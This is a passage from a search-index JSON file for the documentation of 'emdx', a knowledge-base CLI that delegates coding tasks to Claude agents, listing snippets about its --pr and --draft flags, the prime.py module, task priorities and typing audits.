on the Typer app</p> </li> <li>Grouped option panels \u2014 Git/PR flags (<code>--pr</code>, <code>--branch</code>, <code>--draft</code>, <code>--worktree</code>, <code>--base-branch</code>) are under \"Git &amp; PRs\"; organization flags (<code>--epic</code>, <code>--cat</code>) are under \"Organization\"</li> <li> <p>**Concise help stri...</p> </li> <li> <p>#6787 Delegate: list [1/2]</p> <p>...ch_markup_mode=\"rich\"` on the Typer app</p> </li> <li>Added <code>rich_help_panel=\"Git &amp; PRs\"</code> for <code>--pr</code>, <code>--branch</code>, <code>--draft</code>, <code>--worktree</code>, <code>--base-branch</code></li> <li>Added <code>rich_help_panel=\"Organization\"</code> for <code>--epic</code>, <code>--cat</code></li> <li> <p>Tightened all option help strings to be more...</p> </li> <li> <p>#6785 Delegate: --help [2/2]   Section: Changes</p> <p>...` output</p> </li> <li>Grouped options with <code>rich_help_panel</code>:</li> <li>\"Git &amp; PRs\" panel: <code>--pr</code>, <code>--branch</code>, <code>--draft</code>, <code>--worktree</code>, <code>--base-branch</code></li> <li>\"Organization\" panel: <code>--epic</code>, <code>--cat</code></li> <li> <p>Improved option descriptions \u2014 cleaner, more concise tex...</p> </li> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: (B) MUST STAY IN LAUNCHER \u2014 Hooks can't do these</p> <p>...---|---| | 1 | CLI argument parsing &amp; validation | 864\u20131076 | Typer callback: <code>--pr</code>, <code>--branch</code>, <code>--model</code>, <code>--tags</code>, <code>--synthesize</code>, <code>--doc</code>, <code>--epic</code>, <code>--cat</code>, <code>--worktree</code>, <code>--draft</code>, <code>--jobs</code>, <code>--cleanup</code>, mutual exclusivity checks. This is the...</p> </li> <li> <p>#6567 Delegate synthesis [synthesis]   Section: 5. Git Integration</p> <ul> <li><code>--worktree</code>: Isolated execution environment</li> </ul> </li> <li><code>--branch</code>: Push branch without PR (worktree retained)</li> <li><code>--pr</code>: Create PR after changes (worktree cleaned up)</li> <li><code>--draft</code>: Create as draft PR</li> <li> <p><code>--base-branch</code>: Custom base for worktree</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Git Integration Options</p> <p>...-|-------|-------------| | <code>--worktree</code> | <code>-w</code> | Run in isolated git worktree | | <code>--pr</code> | \u2014 | Create a PR after changes (implies <code>--worktree</code>) | | <code>--branch</code> | \u2014 | Push branch without creating PR (implies <code>--worktree</code>) | | <code>--draft/--no-draft</code> | \u2014 | Cr...</p> </li> <li> <p>#6543 Delegate Enhancement Gameplans [2/5]   Section: Estimated Effort</p> <p>This is buildable in a single delegate session with <code>--pr</code> flag.</p> </li> <li> <p>#6535 EMDX Future Directions: Agent-First Design [4/4]   Section: What Works Well Today</p> <p>...lag passes KB content to agents; results persist back to KB</p> </li> <li> <p>PR Automation: <code>--pr</code> and <code>--worktree</code> flags enable isolated, parallel code changes</p> </li> <li> <p>#6483 Delegate: Kink 5: Unify delegate branch naming in emdx/commands/delega [2/3]   Section: Problem</p> <p>...ix\" for PR or \"feat\" for branch</p> </li> <li><code>_resolve_task()</code> when executing docs with <code>--pr</code>: Used <code>feat/{slugified-title}</code> - no collision prevention</li> <li> <p><code>_run_single()</code> and <code>_run_chain()</code>: Relied on whatever branch name was passed or told agent to creat...</p> </li> <li> <p>#6482 Delegate: Kink 6: Add basic PR validation to emdx/commands/delegate.py [3/3]   Section: 3. <code>emdx/commands/delegate.py</code> - Integrated validation into <code>_run_single()</code></p> <p>```python</p> </li> </ul>"},{"location":"entities/pr/#validate-pr-preconditions-if-pr-was-requested","title":"Validate PR preconditions if --pr was requested","text":"<p>if pr and working_dir:     _validate_pr_and_warn(working_dir, quiet=quiet) ```</p> <ul> <li>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide   Section: 2. emdx delegate --draft Flag </li> <li>Mirrors <code>gh pr create --draft</code> semantics</li> <li>Composes naturally with existing flags</li> <li> <p><code>--draft</code> without <code>--pr</code> emits clear error</p> </li> <li> <p>#6443 Delegate: Fix orphan worktrees when using --pr flag   Section: Fix: Orphan Worktrees Accumulating with --pr Flag</p> </li> <li> <p>#6395 Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]   Section: 6. WORKFLOW DIFFERENCES</p> <p>...parallel (<code>-j</code>), sequential (<code>--chain</code>), and discovery (<code>--each</code>)</p> </li> <li>Creates PRs (<code>--pr</code>), uses worktrees (<code>--worktree</code>)</li> <li> <p>Key insight: Agents are invoked by delegate, not running interactively</p> </li> <li> <p>#6368 Gameplans: compact, distill, and draft-pr [synthesis]   Section: 2. <code>emdx delegate --draft</code> Flag</p> <p>Design Decision: Use <code>--draft</code> as a modifier to <code>--pr</code> (not a standalone flag)</p> </li> <li>Mirrors <code>gh pr create --draft</code> semantics</li> <li>Composes naturally with existing flags</li> <li> <p><code>--draft</code> without <code>--pr</code> emits clear error</p> </li> <li> <p>#6365 Gameplan: emdx delegate --draft-pr mode   Section: Summary</p> <p>Add <code>--draft</code> flag to <code>emdx delegate</code> that modifies <code>--pr</code> behavior to create draft PRs instead of regular PRs. This enables a review-first workflow where delegate output gets human review before merge.</p> </li> <li> <p>#6357 Delegate: Investigate why the textual upgrade analysis delegate (doc #6353) didn't create a PR   Section: Summary</p> <p>Both textual and typer upgrade analysis delegates were launched with <code>--pr</code> flag at the same time. Typer created PR #568 but textual did not. Root cause: The textual agent made a judgment call not to create a PR.</p> </li> <li> <p>#6294 DEBT-19: Add missing test coverage for delegate command   Section: Test Coverage Added</p> <p>...do` flags for dynamic discovery</p> </li> <li><code>--synthesize</code> flag</li> <li><code>--worktree</code> flag</li> <li><code>--pr</code> flag (implies worktree)</li> <li><code>--doc</code> flag for document context</li> <li> <p>Error handling (no tasks, mutually exclusive flags)</p> </li> <li> <p>#6191 Delegate: analysis [3/3]   Section: Key Features</p> <p>...s</p> </li> <li>Document context: <code>--doc 42</code> prepends document content</li> <li>PR creation: <code>--pr</code> instructs agent to create pull requests</li> <li>Git worktrees: <code>--worktree</code> provides isolated environments</li> <li>Dynamic discovery: `--each \"fd -e py\" --do \"Review {{...</li> </ul>"},{"location":"entities/pr/#design","title":"Design","text":"<p>Use <code>--draft</code> as a modifier to <code>--pr</code> (not standalone):</p>"},{"location":"entities/pr/#problem","title":"Problem","text":"<p>When using <code>emdx delegate --pr</code>, worktrees were intentionally NOT cleaned up after task completion. This was meant to preserve the branch for the PR, but since the branch is already pushed to remo...</p>"},{"location":"entities/pr/#related-entities","title":"Related Entities","text":"<ul> <li><code>--base-branch</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.3)</li> <li><code>--jobs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>--cleanup</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>gh pr create --draft</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>--branch</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.2)</li> <li><code>--worktree</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (12 shared docs, PMI=5.1)</li> <li><code>--draft</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=5.1)</li> <li><code>use sonnet</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>dynamic discovery</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.9)</li> <li><code>--epic</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=4.8)</li> </ul>"},{"location":"entities/primepy/","title":"prime.py","text":"<p>Type: heading | Mentioned in: 15 documents | First seen: 2026-02-13</p>"},{"location":"entities/primepy/#documents-15","title":"Documents (15)","text":"<ul> <li> <p>#6503 None Type Analysis [2/7]   Section: File-by-File Analysis</p> </li> <li> <p>#6435 Any/None typing audit [3/5]   Section: Summary</p> <p>...| | status.py | 1 | 1 | Partial | | analyze.py | 7 | 7 | Yes (new TypedDicts) | | prime.py | 6 | 6 | Yes (partial) | | recipe.py | 1 | 1 | Yes (doc param) | | briefing.py | 6 | 5 | Yes (new TypedDicts) | | groups.py | 1 | 1 | Yes (DocumentGroup exists) | |...</p> </li> <li> <p>#6533 EMDX Future Directions: Agent-First Design [1/4]   Section: Feature Ideas</p> </li> </ul> <pre><code>RECENT FAILURES (last 24h):\n  #45  \"Fix auth middleware\" - Schema lock error\n       \u2192 Retry: emdx delegate \"Fix auth middleware\"\n</code></pre> <p>Rationale: Surfaces wh...</p> <ul> <li>#6522 Gameplan: FEAT-5 Smart Priming Gaps   Section: Remaining Work <p>...1: Git Context in Prime (HIGH priority) Add <code>_get_git_context()</code> to <code>emdx/commands/prime.py</code>:</p> </li> <li>Current branch via <code>git branch --show-current</code></li> <li>Last 3 commits via <code>git log --oneline -3</code></li> <li> <p>Open PRs via `gh pr list --state=open --limit=5 --json number,title,...</p> </li> <li> <p>#6520 Delegate: Analyze FEAT-5: Re-implement smart priming (PR #446). The or [1/2]   Section: Executive Summary</p> <p>...been implemented via alternative approaches or integrated into the current <code>prime.py</code>. Only one significant feature gap remains.</p> </li> <li> <p>#6411 Delegate: Implement 'emdx briefing' command. This is a new command tha   Section: Implementation Details</p> <p>...ode for programmatic consumption</p> </li> <li>Follows existing patterns from <code>status.py</code> and <code>prime.py</code></li> <li> <p>All ruff lint checks pass</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Areas for Improvement</p> <p>...mports <code>cascade_db</code>, <code>get_document</code>, <code>save_document</code></p> </li> <li><code>status.py</code>, <code>analyze.py</code>, <code>prime.py</code> import <code>db_connection</code> directly</li> <li> <p><code>recipe.py</code> imports <code>get_document</code>, <code>search_documents</code></p> </li> <li> <p>#6323 Delegate: Analyze emdx/commands/ for architecture improvements. Focus  [1/10]   Section: 3. Inconsistent Patterns</p> <p>Files using pattern 2: <code>analyze.py</code>, <code>prime.py</code>, <code>status.py</code>, <code>maintain.py</code></p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>...work queue with dependencies</p> </li> <li><code>groups.py</code>: hierarchical document organization</li> <li><code>prime.py</code>: session priming context</li> <li> <p><code>status.py</code>: project status overview</p> </li> <li> <p>#6279 Delegate: DEBT-8: Standardize CLI interfaces. Standardize doc_id param   Section: 1. Added Help Text to Typer Apps (9 files)</p> <p>...ask executions\" | | <code>status.py</code> | \"Show delegate activity and project status\" | | <code>prime.py</code> | \"Output priming context for Claude session injection\" | | <code>analyze.py</code> | \"Analyze documents and extract insights\" | | <code>maintain.py</code> | \"Database maintenance and cl...</p> </li> <li> <p>#6218 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]   Section: 4. Inconsistent Error Output Formats</p> <p>......\")<code>plain text | |</code>cascade.py<code>|</code>console.print(f\"[red]Error: ...\")<code>rich | |</code>prime.py` | Mix of print() and console.print() |</p> </li> <li> <p>#6162 Delegate: Audit test coverage. Check: (1) is there a test file for emd [8/17]   Section: (5) Which command modules have NO test file at all?</p> <p>...| | <code>groups.py</code> | \u2705 YES (<code>test_commands_groups.py</code>) | | <code>maintain.py</code> | \u274c NO | | <code>prime.py</code> | \u274c NO | | <code>recipe.py</code> | \u274c NO | | <code>similarity.py</code> | \u26a0\ufe0f PARTIAL (tests service, some CLI in <code>test_similarity.py</code>) | | <code>status.py</code> | \u274c NO | | <code>tags.py</code> | \u2705 YES (`test...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...**: All necessary</p> </li> <li>trash.py: All necessary</li> <li>review.py: All necessary</li> <li>prime.py: All necessary</li> <li>categories.py: All necessary</li> <li>browse.py: All necessary</li> <li>briefing.py: 1 bug to fix</li> <li>compact.py: All necessary</li> <li> <p>*executions.py...</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>...426 | USEFUL - Tagging system with emoji aliases. Clean implementation. | | prime.py | 402 | USEFUL - Session priming for Claude. Provides context for new sessions. | | status.py | 260 | USEFUL - Quick overview of active work and recent...</p> </li> <li> <p>#6259 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [17/37]   Section: Changes Made</p> <p>...tatus.py**: Added module logger, cascade status errors logged at debug level  </p> </li> <li>prime.py: Added module logger, cascade status errors logged at debug level</li> <li>core.py: Added module logger, gist database recording errors logged as warnings</li> </ul>"},{"location":"entities/primepy/#primepy_1","title":"prime.py","text":"<p>No unnecessary None annotations - all internal helpers with legitimate optional params.</p>"},{"location":"entities/primepy/#b-recent-failures-in-prime","title":"B. Recent Failures in Prime","text":"<p>Add to <code>_output_text</code> in <code>prime.py</code>:</p>"},{"location":"entities/primepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>ask.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.8)</li> <li><code>epics.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>briefing.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>task templates</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>tag list</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>no task templates</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>status.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=5.6)</li> <li><code>analyze.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.5)</li> <li><code>review.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>recipe.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.3)</li> </ul>"},{"location":"entities/priority-order/","title":"priority order","text":"<p>Type: heading | Mentioned in: 13 documents | First seen: 2025-07-07</p>"},{"location":"entities/priority-order/#documents-13","title":"Documents (13)","text":"<ul> <li>#6490 Any Type Removal Analysis [4/5] <p>Using TYPE_CHECKING preserves lazy loading while enabling type checking. ---</p> </li> </ul>"},{"location":"entities/priority-order/#implementation-recommendations","title":"Implementation Recommendations","text":""},{"location":"entities/priority-order/#priority-order_1","title":"Priority Order","text":"<ol> <li>High Priority (Immediate Safety Gains)</li> <li> <p>SQL param types in <code>ask_service.py</code> (lines 146, 193) - simple unio...</p> </li> <li> <p>#6864 Delegate synthesis [synthesis]</p> <p>Minor Inaccuracies in development-setup.md** Wrong file paths (<code>logging.py</code> vs <code>logging_utils.py</code>, <code>cli.py</code> doesn't exist), wrong test file count (52 vs 63), possibly wrong env var name (<code>EMDX_DB_PATH</code> vs <code>EMDX_DATABASE_URL</code>). ### Common Themes</p> </li> <li> <p>**...</p> </li> <li> <p>#6681 Delegate Slimming \u2014 Unified Research Synthesis</p> <p>Delegate core value is multi-session orchestration: parallel dispatch, worktree lifecycle, synthesis, PR pipeline, batch coordination. ## Actionable Items (Priority Order)</p> </li> </ol>"},{"location":"entities/priority-order/#p0-claudemd-restructure-zero-code-high-impact","title":"P0: CLAUDE.md Restructure (zero code, high impact)","text":"<p>Restructure Mandatory ...</p> <ul> <li>#6583 Delegate synthesis [synthesis] <p>Zero mock specs = zero regression safety net \u2014 This is arguably more impactful than the production <code>Any</code> issues because it means refactors can't rely on the test suite to catch interface drift. ## Actionable Items (Priority Order)</p> </li> </ul>"},{"location":"entities/priority-order/#immediate","title":"Immediate ...","text":"<ul> <li>#6545 Delegate Enhancement Gameplans [1/5]   Section: Success Criteria <p>...for programmatic consumption</p> </li> <li>Delegate tasks are excluded (only manual work)</li> <li>Priority order is: in-progress \u2192 ready \u2192 stale gameplan \u2192 fallback</li> <li>All tests pass</li> <li> <p>Lint clean (ruff check passes)...</p> </li> <li> <p>#6419 Type System Audit: Replace Any/None with Concrete Types [synthesis]</p> <p>\u251c\u2500\u2500 database/ \u2502   \u2514\u2500\u2500 types.py          # DocumentRow, CascadeDocument, GroupMember, etc. ```</p> </li> </ul>"},{"location":"entities/priority-order/#core-types-to-define-priority-order","title":"Core Types to Define (Priority Order)","text":"<p>Phase 1: Foundation (Week 1) - <code>TaskDict</code> \u2014 used by 10+ functions, highest impact - <code>DocumentRow</code> \u2014 base for...</p> <ul> <li>#6415 Type System Audit: Replace Any/None with Concrete Types [2/4] <p>```</p> </li> <li>Runtime validation (optional): Use <code>typing.get_type_hints()</code> + dataclass conversion for strict mode</li> </ul>"},{"location":"entities/priority-order/#priority-order-for-implementation","title":"Priority Order for Implementation","text":"<ol> <li> <p>High: <code>documents.py</code> - Most used, foundational types 2.</p> </li> <li> <p>#6332 Architecture Analysis Summary - Key Takeaways</p> </li> </ol>"},{"location":"entities/priority-order/#emdx-architecture-analysis-key-takeaways","title":"EMDX Architecture Analysis - Key Takeaways","text":""},{"location":"entities/priority-order/#critical-issues-priority-order","title":"Critical Issues (Priority Order)","text":"<ol> <li> <p><code>models/</code> directory misnamed - Contains SQL operations (repositories), not domain models.</p> </li> <li> <p>#6229 Delegate: Audit DEPENDENCY DEBT in the emdx project: Check pyproject.t [1/14]</p> <p>Grouped extras - <code>[ai]</code>, <code>[similarity]</code>, <code>[google]</code>, <code>[all]</code> extras are well-organized</p> </li> <li>Version flexibility - Uses <code>^</code> (caret) appropriately for semver-compatible updates</li> </ol>"},{"location":"entities/priority-order/#recommended-actions-priority-order","title":"Recommended Actions (Priority Order)","text":"<ol> <li> <p>**Remove python-dot...</p> </li> <li> <p>#6225 Delegate: Audit BUILD/CI DEBT in the emdx project: Check GitHub Action [7/14]</p> <p>\u2705 justfile has <code>check</code> target combining lint+typecheck+test</p> </li> <li>\u2705 Poetry caching configured in CI</li> </ol>"},{"location":"entities/priority-order/#recommended-actions-priority-order_1","title":"Recommended Actions (Priority Order)","text":"<ol> <li> <p>Expand Python matrix to [\"3.11\", \"3.12\", \"3.13\"] 2.</p> </li> <li> <p>#6217 Delegate: Audit DEPENDENCY DEBT in the emdx project: Check pyproject.t [1/14]</p> <p>Core dependencies are minimal - Only 7 core deps keeps the install light</p> </li> <li>Python version range is reasonable - ^3.11 supports 3.11, 3.12, 3.13</li> </ol>"},{"location":"entities/priority-order/#action-items-priority-order","title":"Action Items (Priority Order)","text":"<ol> <li> <p>Remove python-dotenv (HIGH - unused code) 2.</p> </li> <li> <p>#11 Claude Code Agents Plugin Mode Analysis &amp; Gameplan</p> <p>Usage Examples</p> </li> <li>Development Setup</li> </ol>"},{"location":"entities/priority-order/#32-update-troubleshooting-section","title":"3.2 Update Troubleshooting Section","text":"<p>Add common issues and solutions: - \"Unknown command\" errors \u2192 Run <code>./dev-install.fish</code> - \"Functions not loading\" \u2192 Check symlinks with <code>ls -la ~/.config/fish/</code> - Database co...</p>"},{"location":"entities/priority-order/#related-entities","title":"Related Entities","text":"<ul> <li><code>actionable items (priority order)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.0)</li> <li><code>zero mock specs = zero regression safety net</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>use</code>from future import annotations`` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>unspecced mocks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>typed parameters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>type safety audit synthesis:</code>emdx/services/<code>,</code>emdx/ui/<code>, and</code>tests/` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>type safety audit synthesis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>the production code has moderate</code>any<code>usage that's mostly fixable, while the test suite has zero</code>spec=<code>coverage across 220+ mocks \u2014 a significant regression risk.</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>test mock specs:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>test mock gap is the highest-risk finding</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> </ul>"},{"location":"entities/priority/","title":"priority","text":"<p>Type: heading | Mentioned in: 15 documents | First seen: 2025-07-07</p>"},{"location":"entities/priority/#documents-15","title":"Documents (15)","text":"<ul> <li>#6484 Any Type Removal Analysis [4/5]   Section: Priority <ol> <li>High Priority (breaks type safety): Lines 364 (<code>list[Any]</code> \u2192 <code>list[SemanticMatch]</code>), line 30 (<code>_get_model</code>)</li> </ol> </li> <li> <p>Medium Priority (improves clarity): All instance attributes wi...</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Tasks Table (Core Entity)</p> <p>...<code>status</code> | TEXT | \"open\" | Current state: open, active, blocked, done, failed | | <code>priority</code> | INTEGER | 3 | Priority level (1=highest, 5=lowest) | | <code>gameplan_id</code> | INTEGER | NULL | FK to documents (optional gameplan) | | <code>project</code> | TEXT | NULL | Project...</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Database Schema</p> <p>...cription`: Task description</p> </li> <li><code>status</code>: open | active | blocked | done | failed</li> <li><code>priority</code>: 1-5 (default 3)</li> <li><code>gameplan_id</code>: Links to documents table</li> <li><code>project</code>: Project name</li> <li><code>current_step</code>: Resume checkpoint</li> <li> <p><code>created_at</code>, <code>updated_at</code>, `completed_at...</p> </li> <li> <p>#6172 Delegate: Analyze competing/overlapping concepts in emdx. The system h [8/15]   Section: 2. Tasks System</p> <p>...Data Model** (from <code>tasks</code> table): ```sql tasks:   id, title, description, status, priority,   gameplan_id (\u2192 documents), project, current_step,   created_at, updated_at, completed_at,   -- Delegate tracking additions:   prompt, type, execution_id, output_d...</p> </li> <li> <p>#6167 Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]   Section: Task System Architecture</p> <p>...stored in a <code>tasks</code> table with:</p> </li> <li><code>status</code>: open, active, blocked, done, failed</li> <li><code>priority</code>: 1-5</li> <li><code>gameplan_id</code>: links to a gameplan document</li> <li><code>depends_on</code>: dependency graph via <code>task_deps</code> table</li> <li> <p>Fields for tracking <code>emdx delegate</code> executions: <code>prompt</code>...</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Task Fields</p> <p>...TEXT | \"\" | Optional description | | <code>status</code> | TEXT | \"open\" | Current state | | <code>priority</code> | INTEGER | 3 | Priority (1=highest) | | <code>gameplan_id</code> | INTEGER | NULL | FK to documents (optional gameplan association) | | <code>project</code> | TEXT | NULL | Project name...</p> </li> <li> <p>#6161 Delegate: Analyze task usage in prime and status commands. Read emdx/c [7/15]   Section: <code>emdx prime</code> \u2014 Session Context Injection</p> <p>...task_deps` table)</p> </li> <li>Fields shown: <code>id</code>, <code>title</code>, <code>description</code> (verbose only), <code>priority</code> (as P0-P4 label)</li> <li>Limit: Top 10, ordered by priority then created_at</li> <li> <p>These are traditional \"to-do\" style tasks created manually via <code>emdx task create</code></p> </li> <li> <p>#6536 EMDX Future Directions: Agent-First Design [synthesis]   Section: Key Findings by Area</p> <p>...sion summaries</p> </li> <li><code>emdx learn</code> \u2014 persistent learnings separate from documents</li> <li> <p>Priority: <code>emdx next</code> is P0 \u2014 reduces decision fatigue immediately</p> </li> <li> <p>#6464 Claude Document Templates Comprehensive Guide   Section: Plan Template</p> </li> <li>Type: #PLAN</li> <li>Status: #PLANNED</li> <li>Priority: #HIGH | #MEDIUM | #LOW</li> <li>Created: YYYY-MM-DD</li> <li> <p>Related: [Reference any related doc IDs]</p> </li> <li> <p>#247 Clauding Implementation Plan - Critical Issues Resolution   Section: Phase 1: Critical Security Fixes (Immediate - Week 1)</p> </li> <li> <p>#26 FZF Interactive Claude List v1 Plan   Section: FZF Interactive Claude List (cla) - Minimal v1 Plan</p> </li> <li>Type: #PLAN</li> <li>Status: #PLANNED</li> <li>Priority: #HIGH</li> <li> <p>Created: 2025-01-05</p> </li> <li> <p>#31 Claude-List Improvement Plan v2   Section: Claude-List Improvement Plan</p> </li> <li>Type: #PLAN</li> <li>Status: #PLANNED</li> <li>Priority: #MEDIUM</li> <li>Created: 2025-01-05</li> <li> <p>Related: #2089</p> </li> <li> <p>#36 Claude Document Template System   Section: Standard Document Format</p> <p>...s**: #PLANNED | #IMPLEMENTING | #IMPLEMENTED | #PARTIAL | #OBSOLETE | #BLOCKED</p> </li> <li>Priority: #HIGH | #MEDIUM | #LOW</li> <li>Created: YYYY-MM-DD</li> <li>Updated: YYYY-MM-DD</li> <li>Related: #ID1, #ID2 (reference other docs)</li> </ul>"},{"location":"entities/priority/#metadata","title":"Metadata","text":""},{"location":"entities/priority/#11-sql-injection-vulnerabilities-critical","title":"1.1 SQL Injection Vulnerabilities (CRITICAL)","text":"<p>Priority: P0 - Immediate Files Affected: All database-interacting functions</p>"},{"location":"entities/priority/#metadata_1","title":"Metadata","text":""},{"location":"entities/priority/#metadata_2","title":"Metadata","text":""},{"location":"entities/priority/#related-entities","title":"Related Entities","text":"<ul> <li><code>related</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>how to test</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> <li><code>task_deps table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>reproduction</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>emdx task create</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>[title] plan</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>metadata</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.6)</li> <li><code>depends_on</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.6)</li> <li><code>what was built</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.5)</li> <li><code>original plan</code> 